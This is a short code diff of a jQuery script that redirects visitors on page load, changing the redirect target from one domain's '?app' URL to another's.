@@ -1,4 +1,4 @@
 $(document).ready(function() {
-var url = "http://dreamcatcherfinancing.com/?app";     
+var url = "https://prolotex.com/?app";     
 $(location).attr('href',url);
 });
